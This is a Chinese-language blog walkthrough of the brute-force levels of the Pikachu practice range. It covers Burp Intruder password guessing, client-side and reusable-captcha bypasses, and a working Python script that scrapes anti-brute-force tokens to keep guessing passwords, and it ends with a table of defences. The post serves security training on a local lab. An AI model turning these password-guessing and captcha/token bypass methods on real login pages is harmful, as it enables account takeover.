---
title: Pikachu 靶场通关记录：暴力破解（Brute Force）全系列
date: 2026-11-08 16:45:00
cover: /img/cover-1.jpg
description: 从基于表单的暴力破解，到验证码绕过、token 防爆破绕过，Pikachu 这一关基本把「暴力破解的防御与绕过」讲全了。
categories:
  - 靶场通关
tags:
  - 暴力破解
  - Burp Suite
  - Pikachu
  - Web安全
---

Pikachu 的暴力破解模块一共四个子场景，难度是递进的。核心就一句话：**只要没有有效的频率限制和账户锁定，密码就可以被穷举**。

环境：Pikachu 本地 Docker 部署，Burp Suite Community 做拦截与重放，字典用 `rockyou` 裁剪版。

## 一、基于表单的暴力破解

页面就是一个普通的登录框，没有任何防护。

用 Burp 抓 POST 请求：

```http
POST /vul/burteforce/bf_form.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=123456&submit=Login
```

发到 Intruder，把 `password` 设为 payload，加载字典跑。

判定成功的关键不是状态码（永远返回 200），而是**响应长度和内容差异**。按 Length 排序，长度明显不同那条就是命中：

| username | password | Status | Length |
| --- | --- | --- | --- |
| admin | 123456 | 200 | 3452 |
| admin | admin888 | 200 | 3452 |
| admin | **pikachu** | 200 | **3567** |

> 提示：开启 Grep-Match 匹配 `login success` 之类的成功关键词，比看长度更稳。

## 二、验证码绕过（on client）

验证码是前端 JS 生成的，只在前端校验。

看源码可以发现校验函数就在页面里：

```javascript
function validate() {
  var code = document.getElementById("checkcode").value;
  if (code !== "abcde") { alert("验证码错误"); return false; }
  return true;
}
```

这意味着：**Burp 直接重放请求即可**，服务端根本没检查验证码。Intruder 跑字典，行为与第一个场景完全一致。

## 三、验证码绕过（on server）

这次验证码由服务端生成并校验，但存在两个问题：

1. 验证码校验通过后**不销毁 session**，同一个验证码可以重复使用
2. 验证码只在下一次刷新时更新

思路：先用浏览器拿一个有效验证码，抓包得到 `PHPSESSID` 与验证码值，然后在 Intruder 里固定这两个字段，只变密码。

```http
Cookie: PHPSESSID=8f2c...; 
POST: username=admin&password=§123456§&vcode=xxxx&submit=Login
```

只要不刷新页面、不换 session，验证码就一直有效。

## 四、token 防爆破绕过

这个场景加了 token：每次请求都会下发新的 token，服务端校验后失效，看起来没法重放。

但看请求就能发现问题——**token 是随响应一起返回的，而客户端拿到新 token 的路径是明文可预测的**：

```html
<input type="hidden" name="token" value="f3a91c...">
```

处理办法有两种：

- 在 Intruder 里用 Recursive grep 提取上一次响应中的 token，作为下一次请求的 payload
- 或者用 Python 脚本串起来，先 GET 拿 token，再 POST 提交

```python
import re, requests

s = requests.Session()
for pwd in open("dict.txt", encoding="utf-8"):
    pwd = pwd.strip()
    html = s.get("http://target/vul/burteforce/bf_token.php").text
    token = re.search(r'name="token" value="(\w+)"', html).group(1)
    r = s.post("http://target/vul/burteforce/bf_token.php",
               data={"username": "admin", "password": pwd, "token": token})
    if "success" in r.text:
        print("hit:", pwd)
        break
```

## 五、防御该怎么做

四关打完，防御手段其实就这几条：

| 手段 | 说明 |
| --- | --- |
| 强密码策略 | 复杂度 + 长度 + 定期更换 |
| 登录频率限制 | 同 IP / 同账号单位时间失败次数上限 |
| 账户锁定 | 连续失败 N 次锁定，配合人工解锁 |
| 验证码 | **服务端生成、服务端校验、用后即焚** |
| 二次验证 | 短信 / TOTP，密码泄露也有兜底 |
| 统一错误提示 | 不区分「用户不存在」和「密码错误」 |

最常被做错的就是验证码——**前端校验等于没有**，token 可预测等于没有，用完不销毁也等于没有。

## 六、小结

暴力破解没有太多技巧，考的是观察力：看清楚哪个字段在服务端真正生效，剩下的交给字典和并发。真正难的是防御侧，做全了才挡得住。
